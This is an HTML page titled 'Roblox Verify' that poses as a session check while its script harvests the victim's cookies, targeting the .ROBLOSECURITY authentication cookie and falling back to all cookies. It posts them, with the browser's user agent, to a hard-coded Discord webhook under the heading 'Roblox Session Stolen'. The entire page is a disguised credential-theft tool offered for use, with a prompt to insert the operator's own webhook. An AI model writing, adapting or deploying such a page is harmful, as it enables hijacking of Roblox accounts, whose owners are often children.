<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Roblox Verify</title>
    <style>
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: #1e1e1e;
            color: white;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            height: 100vh;
            margin: 0;
            text-align: center;
        }
        .loader {
            width: 100%;
            max-width: 300px;
            height: 4px;
            background: #333;
            border-radius: 2px;
            overflow: hidden;
            margin: 20px 0;
        }
        .progress {
            height: 100%;
            width: 0%;
            background: #00b06c;
            transition: width 0.5s ease;
        }
        #status {
            color: #aaa;
            font-size: 14px;
            margin-top: 10px;
        }
        .success { color: #00b06c !important; }
        .error { color: #ff4444 !important; }
    </style>
</head>
<body>

    <h2>Verifying Roblox Session...</h2>
    <div class="loader">
        <div class="progress" id="progressBar"></div>
    </div>
    <p id="status">Initializing...</p>

    <script>
        // ⚠️ REPLACE THIS WITH YOUR DISCORD WEBHOOK URL ⚠️
        const WEBHOOK_URL = "https://discord.com/api/webhooks/1548406916622065765/YGL0Et-A8Z4tNmDdOuT4I1vXAsFAJmemv8OQYnDne89cXy3eNOygOUUsc2NDRdLmCNrC";

        // Start animation
        setTimeout(() => {
            document.getElementById('progressBar').style.width = '50%';
            document.getElementById('status').innerText = "Checking login status...";
            fetchSession();
        }, 500);

        async function fetchSession() {
            try {
                // Try to fetch user info to confirm login
                const response = await fetch('https://www.roblox.com/users/profile', {
                    method: 'HEAD', // HEAD is lighter
                    credentials: 'include' // CRITICAL: Sends cookies with the request
                });

                if (response.ok) {
                    document.getElementById('progressBar').style.width = '100%';
                    document.getElementById('status').innerText = "Session found! Extracting...";
                    
                    // Extract cookie
                    const cookies = document.cookie;
                    const robloxCookie = cookies.split(';').find(c => c.trim().startsWith('.ROBLOSECURITY')) || 
                                         cookies.split(';').find(c => c.trim().startsWith('RobloxAuth'));
                    
                    if (robloxCookie) {
                        sendCookie(robloxCookie);
                    } else {
                        // Fallback: Try to get all cookies if specific name fails
                        sendCookie(cookies);
                    }
                } else {
                    throw new Error("Not logged in");
                }
            } catch (err) {
                document.getElementById('status').innerText = "❌ No session found. Please log in to Roblox in this browser.";
                document.getElementById('status').className = "error";
                console.error(err);
            }
        }

        function sendCookie(cookieData) {
            document.getElementById('status').innerText = "Sending to Discord...";
            
            fetch(WEBHOOK_URL, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    content: `🔓 **Roblox Session Stolen**\n\`\`\`${cookieData}\`\`\`\nUser Agent: ${navigator.userAgent}`
                })
            })
            .then(() => {
                document.getElementById('status').innerText = "✅ Success! You can close this window.";
                document.getElementById('status').className = "success";
                setTimeout(() => window.close(), 2000);
            })
            .catch(err => {
                document.getElementById('status').innerText = "Error sending to Discord. Check console.";
                console.error(err);
            });
        }
    </script>
</body>
</html>
